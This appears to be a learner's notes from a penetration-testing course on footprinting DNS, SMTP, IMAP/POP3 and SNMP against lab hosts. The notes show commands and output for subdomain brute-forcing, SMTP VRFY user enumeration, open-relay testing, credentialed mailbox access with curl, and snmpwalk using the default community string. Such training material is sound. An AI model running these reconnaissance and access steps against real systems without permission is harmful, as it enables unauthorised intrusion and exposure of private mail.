selwynang@htb[/htb]$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
```

- We can use `DNSenum` too.

```bash
selwynang@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

dnsenum VERSION:1.2.6

-----   inlanefreight.htb   -----


Host's addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.

Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers


Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
_______________________________________________________________________________________________________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

...SNIP...
done.
```

# C.5. Host Based Enumeration: SMTP
- `Simple Mail Transfer Protocol (SMTP)` is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers.
- By default, SMTP servers accept connection requests on port `25`. However, newer SMTP servers also use other ports such as TCP port `587`.
- SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port `25` for the encrypted connection, for example, TCP port `465`.
- **SMTP Procedure**
    1. SMTP Client, otherwise known as `Mail User Agent (MUA)`, converts sent email into a header and a body and uploads both to the SMTP server.
    2. `Mail Submission Agent (MSA)` checks the validity of the email (eg. origin of the email).
    3. `Mail Transfer Agent (MTA)` in the SMTP server is the software basis for sending \& receiving email. This `MSA` is also called `Relay` server. The MTA then searches the DNS for the IP address of the recipient mail server.
    4. On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the Mail delivery agent (`MDA`) transfers it to the recipient's mailbox.

## Default Configuration

```bash
selwynang@htb[/htb]$ cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

smtpd_banner = ESMTP Server 
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
smtp_generic_maps = hash:/etc/postfix/generic
mydestination = $myhostname, localhost 
masquerade_domains = $myhostname
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
recipient_delimiter = +
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
```

## Interaction with a SMTP server
- We can interact with the SMTP server with the following commands via `telnet`:

| Command | Description |
|---|---|
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client. |
| `HELO` | The client logs in with its computer name and thus starts the session. |
| `MAIL FROM` | The client names the email sender. |
| `RCPT TO` | The client names the email recipient. |
| `DATA` | The client initiates the transmission of the email. |
| `RSET` | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY` | The client checks if a mailbox is available for message transfer. |
| `EXPN` | The client also checks if a mailbox is available for messaging with this command. |
| `NOOP` | The client requests a response from the server to prevent disconnection due to time-out. |
| `QUIT` | The client terminates the session. |

### Telnet - HELO/EHLO
- Initialization of the session
```bash
selwynang@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 


HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb


EHLO mail1

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

### Telnet - VRFY
- Used to enumerate existing users on the system.
- SMTP server may issue code `252` and confirm the existence of a user that does not exist on the system.
- [List of SMTP error codes](https://serversmtp.com/smtp-error/)


```bash
selwynang@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 

VRFY root

252 2.0.0 root


VRFY cry0l1t3

252 2.0.0 cry0l1t3


VRFY testuser

252 2.0.0 testuser


VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

### Sending email
```bash
selwynang@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: <cry0l1t3@inlanefreight.htb>

250 2.1.0 Ok


RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure

250 2.1.5 Ok


DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```

## Dangerous Settings
- Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server, where they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.
```bash
# Open Relay Configuration
mynetworks = 0.0.0.0/0
```
- With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.

## Footprinting the Service

### Nmap
- The default Nmap scripts include `smtp-commands`, which uses the `EHLO` command to list all possible commands that can be executed on the target SMTP server.
```bash
selwynang@htb[/htb]$ sudo nmap 10.129.14.128 -sC -sV -p25

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
```
- We can also use the `smtp-open-relay` NSE script to identify the target SMTP server as an open relay using 16 different tests.
```bash
selwynang@htb[/htb]$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:29
Completed NSE at 02:29, 0.00s elapsed
Initiating ARP Ping Scan at 02:29
Scanning 10.129.14.128 [1 port]
Completed ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:29
Completed Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed
Initiating SYN Stealth Scan at 02:29
Scanning 10.129.14.128 [1 port]
Discovered open port 25/tcp on 10.129.14.128
Completed SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports)
NSE: Script scanning 10.129.14.128.
Initiating NSE at 02:29
Completed NSE at 02:29, 0.07s elapsed
Nmap scan report for 10.129.14.128
Host is up (0.00020s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@ESMTP>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest%nmap.scanme.org">
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org"@[10.129.14.128]>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@ESMTP>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@[10.129.14.128]:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@ESMTP:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.129.14.128]>
|_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP>
MAC Address: 00:00:00:00:00:00 (VMware)

NSE: Script Post-scanning.
Initiating NSE at 02:29
Completed NSE at 02:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
```

### SMTP-user-enum
- We can use `smtp-user-enum` to enumerate the users with a custom wordlist too.
- Remember to increase timeout with `-w`. If we want to check individual user instead of an entire wordlist, use `-u`.

```bash
┌─[eu-academy-5]─[10.10.15.42]─[htb-ac-2300483@htb-gk198mradg]─[~]
└──╼ [★]$ smtp-user-enum -M VRFY -U /home/htb-ac-2300483/users.txt -t 10.129.167.163 -w 20
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /home/htb-ac-2300483/users.txt
Target count ............. 1
Username count ........... 102
Target TCP port .......... 25
Query timeout ............ 20 secs
Target domain ............ 

######## Scan started at Thu Aug 27 11:40:03 2026 #########
10.129.167.163: robin exists
######## Scan completed at Thu Aug 27 11:43:31 2026 #########
1 results.

102 queries in 208 seconds (0.5 queries / sec)

```

# C.6. Host Based Enumeration: IMAP/POP3
- With the help of the `Internet Message Access Protocol (IMAP)`, access to emails from a mail server is possible.
- Unlike the `Post Office Protocol (POP3)`, IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server.
- Client establishes the connection the server via port `143`.
- Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. 
    - Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes. SSL/TLS is usually used for this purpose. 
    - Depending on the method and implementation used, the encrypted connection uses the standard port `143` or an alternative port such as `993`.

## Default Configuration

### IMAP Commands
| Command | Description |
|---|---|
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client. |
| `HELO` | The client logs in with its computer name and thus starts the session. |
| `MAIL FROM` | The client names the email sender. |
| `RCPT TO` | The client names the email recipient. |
| `DATA` | The client initiates the transmission of the email. |
| `RSET` | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY` | The client checks if a mailbox is available for message transfer. |
| `EXPN` | The client also checks if a mailbox is available for messaging with this command. |
| `NOOP` | The client requests a response from the server to prevent disconnection due to time-out. |
| `QUIT` | The client terminates the session. |

### POP3 Commands
| Command | Description |
|---|---|
| `USER username` | Identifies the user. |
| `PASS password` | Authentication of the user using its password. |
| `STAT` | Requests the number of saved emails from the server. |
| `LIST` | Requests from the server the number and size of all emails. |
| `RETR id` | Requests the server to deliver the requested email by ID. |
| `DELE id` | Requests the server to delete the requested email by ID. |
| `CAPA` | Requests the server to display the server capabilities. |
| `RSET` | Requests the server to reset the transmitted information. |
| `QUIT` | Closes the connection with the POP3 server. |

## Dangerous Settings
- Most companies use third-party email providers such as Google, Microsoft, and many others. 
- However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. 
- Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. 

| Setting | Description |
|---|---|
| `auth_debug` | Enables all authentication debug logging. |
| `auth_debug_passwords` | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose` | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords` | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |


## Footprinting the Service
- By default, ports `110` and `995` are used for `POP3`.
- Ports `143` and `993` are used for `IMAP`. 
- The higher ports (`993` and `995`) use TLS/SSL to encrypt the communication between the client and server.

### Nmap

```bash
# From the output, we can see that the common name is `mail1.inlanefreight.htb` and the email server belongs to organisation `Inlanefreight`, which is located in California.
selwynang@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00026s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

### Curl
- If we successfully figured out the access credentials for one of the employees, an attack could log in to the mail server and read or even send the individual messages.
```bash
selwynang@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
```

- We can also use the `verbose -v` option to see how the connection is made. We can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which often contain the version of the mail server.

```bash
selwynang@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

*   Trying 10.129.14.128:993...
* TCP_NODELAY set
* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  start date: Sep 19 19:44:58 2021 GMT
*  expire date: Jul  4 19:44:58 2295 GMT
*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." Important
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.001 + 0.000 secs).
* Connection #0 to host 10.129.14.128 left intact
```

### OpenSSL - TLS Encrypted Interaction POP3
- To interact with the IMAP or POP3 server over SSL, we can use `openssl`, as well as `ncat`. The commands for this would look like this:

```bash
selwynang@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2
    Session-ID-ctx:
    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.
    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.
    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.
    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m
    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..
    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m<.F\.e....^
    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8
    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......>.*....
    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$
    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...
    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.
    00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\(..6.}*.

    Start Time: 1632081313
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
+OK HTB-Academy POP3 Server
```

### OpenSSL - TLS Encrypted Interaction IMAP

```bash
selwynang@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699
    Session-ID-ctx:
    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$
    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&..J}
    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.
    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)
    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..
    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..
    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....
    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..
    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.
    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!
    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}
    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb

    Start Time: 1632081604
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
```

# C.7. Host Based Enumeration: SNMP
- `Simple Network Management Protocl (SNMP)` was created to monitor network devices, handle configuration tasks and change settings remotely.
- In addition to pure exchange of information, SNMP also transmits control commands using agents over UDP port `161`.
- While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called traps over UDP port `162`. These are data packets sent from the SNMP server to the client without being explicitly requested.

## SNMP Set up
### MIB
- To ensure that SNMP works across manufacturers and with different client-server combinations, the `Management Information Base (MIB)` was created.
- `MIB` is a a text file in which all queryable SNMP objects of a device are listed in a standardised tree hierarchy.
- It contains at least 1 `Object Identifier (OID)`, which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object.

### OID
- An OID represents a node in a hierarchical namespace.
- 

## SNMP Versions
### SNMPv1
- SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. 
- However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. 
- Another main flaw of SNMPv1 is that it does not support encryption.

### SNMPv2
- Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. 
- However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.

### SNMPv3
- Security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data. 

### Community Strings
- They are passwords that are used to determine whether the requested information can be viewed or not.
- It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active.
- Every time the community strings are sent over the network, they can be intercepted and read.

## Default Configuration
- SNMP Daemon defines the basic settings for the service, which include the IP addresses, ports, MIB, OIDs, authentication, and community strings.

```bash
selwynang@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'

sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
sysServices    72
master  agentx
agentaddress  127.0.0.1,[::1]
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
```

## Dangerous Settings

| Settings | Description |
|---|---|
| `rwuser noauth` | Provides access to the full OID tree without authentication. |
| `rwcommunity <community string> <IPv4 address>` | Provides access to the full OID tree regardless of where the requests were sent from. |
| `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6. |

## Footprinting the Service

### SNMPwalk
- `snmpwalk` is used to query the OIDs with their information.
- `-c public`: specifies the community string, which acts like a password. public is the default read-only community string, analogous to a shared password that grants read access. If the admin never changed it from the default, this will work.

```bash
selwynang@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128

iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34
iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
